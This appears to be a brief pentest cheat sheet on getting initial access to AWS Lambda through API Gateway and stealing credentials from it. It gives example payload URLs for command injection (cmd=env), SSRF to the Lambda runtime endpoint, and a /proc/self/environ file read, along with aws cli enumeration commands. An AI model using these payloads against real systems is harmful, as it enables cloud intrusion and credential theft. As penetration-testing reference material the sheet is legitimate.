# AWS Lambda and API Gateway Initial Access

### Its possible to get RCE through API Gateway if it executes commands.

### If you can execute commands, there is a way to retrieve keys from the API Gateway, just use env , configure aws cli and proceed with the exploitation.

# Credential Access

### Getting credentials from Lambda can be done in 2 ways

#### 1) Keys in the source code

#### 2) Keys in the enviromnent variables

### These keys can be gathered using SSRF, RCE and so on.

## Getting credentials using RCE

    https://apigateway/prod/system?cmd=env

## Getting credentials using SSRF

    https://apigateway/prod/example?url=http://localhost:9001/2018-06-01/runtime/invocation/

## Getting credentials using SSRF and wrappers

    https://apigateway/prod/system?cmd=file:///proc/self/environ

## Getting credentials from lambda enviroment variables (cli)

### It's important to enumerate the functions first with: 

    aws lambda list-functions

### Then:

    aws lambda get-function --function-name NAME 
